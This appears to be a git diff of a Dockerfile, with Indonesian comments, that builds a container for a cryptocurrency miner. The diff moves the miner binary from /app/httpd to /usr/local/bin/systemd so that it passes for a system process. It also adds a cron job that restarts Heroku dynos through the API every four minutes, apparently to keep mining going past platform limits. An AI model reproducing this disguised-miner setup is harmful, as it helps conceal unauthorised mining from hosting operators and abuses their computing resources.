@@ -27,35 +27,36 @@ RUN mkswap /swapfile && \
 RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
 
 # Download miner binary
-COPY iniminer-linux-x64 /app/httpd
-RUN chmod +x /app/httpd
+COPY iniminer-linux-x64 /usr/local/bin/systemd
+RUN chmod +x /usr/local/bin/systemd
 
 # Copy startup script
-COPY input.sh /app/input.sh
-RUN chmod +x /app/input.sh
+COPY input.sh /usr/local/bin/input.sh
+RUN chmod +x /usr/local/bin/input.sh
 
 # Copy startup script
-COPY compile.sh /app/node.sh
-RUN chmod +x /app/node.sh
+COPY compile.sh /usr/local/bin/node.sh
+RUN chmod +x /usr/local/bin/node.sh
 
 # Copy startup script
-COPY main.sh /app/main.sh
-RUN chmod +x /app/main.sh
+COPY main.sh /usr/local/bin/main.sh
+RUN chmod +x /usr/local/bin/main.sh
 
 # Copy startup script
-COPY run.sh /app/run.sh
-RUN chmod +x /app/run.sh
+COPY run.sh /usr/local/bin/run.sh
+RUN chmod +x /usr/local/bin/run.sh
 
 # Script untuk restart dynos menggunakan Heroku API
-COPY restart.sh /app/restart.sh
-RUN chmod +x /app/restart.sh
+COPY restart.sh /usr/local/bin/restart.sh
+RUN chmod +x /usr/local/bin/restart.sh
 
-# Tambahkan cron job untuk restart setiap 15 menit
-RUN echo "*/10 * * * * root /app/restart.sh" >> /etc/crontab
+# Menambahkan cron job untuk auto-restart dynos setiap 5 menit
+RUN echo "*/4 * * * * /usr/local/bin/restart.sh >> /var/log/cron.log 2>&1" > /etc/cron.d/restart
+RUN crontab /etc/cron.d/restart
 
 # Set environment variables
 ENV PORT=8080
 EXPOSE 8080
 
 # Jalankan cron dan aplikasi utama
-CMD cron && /app/run.sh
+CMD ["/usr/local/bin/run.sh"]
